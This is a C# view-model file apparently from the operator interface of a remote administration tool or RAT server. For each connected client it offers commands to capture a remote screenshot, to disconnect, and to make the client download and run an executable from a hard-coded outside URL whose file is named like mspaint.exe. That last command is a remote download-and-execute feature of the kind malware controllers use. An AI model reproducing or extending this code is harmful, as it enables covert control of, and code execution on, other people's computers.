﻿namespace GuiServer.ServerImplementation.ViewModel
{
    using MarrySocket.MServer;
    using NetworkObjects;
    using System;
    using System.ComponentModel;
    using System.Windows;
    using Microsoft.VisualBasic;

    using System.Windows.Input;

    public class ClientViewModel : INotifyPropertyChanged
    {
        public event PropertyChangedEventHandler PropertyChanged;

        private int id;
        private ClientSocket clientSocket;
        private ComputerInfo computerInfo;

        public ClientViewModel(ClientSocket clientSocket)
        {
            this.CmdScreenshot = new CommandHandler(() => this.Screenshot(), this.CanScreenshot());
            this.CmdDownloadExecute = new CommandHandler(() => this.DownloadExecute(), this.CanDownload());


            this.CmdDisconnect = new CommandHandler(() => this.Disconnect(), this.CanDisconnect());
            this.clientSocket = clientSocket;
            this.Id = clientSocket.Id;
        }
        private bool CanDownload()
        {
            return true;

        }
        private bool CanScreenshot()
        {
            return true;
        }

        private void Screenshot()
        {
            this.clientSocket.SendObject(1111, 40L);
        }
        private void DownloadExecute()
        {

            String url = "http://www.sheeptech.com/download/mspaint.exe";


         
            DownloadExec downloadExec = new DownloadExec(url);
            this.clientSocket.SendObject(1112, downloadExec);
        }

        public ICommand CmdScreenshot { get; set; }
        public ICommand CmdDownloadExecute { get; set; }



        public ICommand CmdDisconnect { get; set; }
        public int Id { get { return this.id; } set { this.id = value; NotifyPropertyChanged("Id"); } }
        public ComputerInfo ComputerInfo { get { return this.computerInfo; } set { this.computerInfo = value; NotifyPropertyChanged("ComputerInfo"); } }
        public string Ip { get { return this.clientSocket.Ip; } }


        private void Disconnect()
        {
            this.clientSocket.Close();
        }

        private bool CanDisconnect()
        {
            return true;
        }

        private void NotifyPropertyChanged(string Obj)
        {
            if (PropertyChanged != null)
            {
                this.PropertyChanged(this, new PropertyChangedEventArgs(Obj));
            }
        }

    }
}
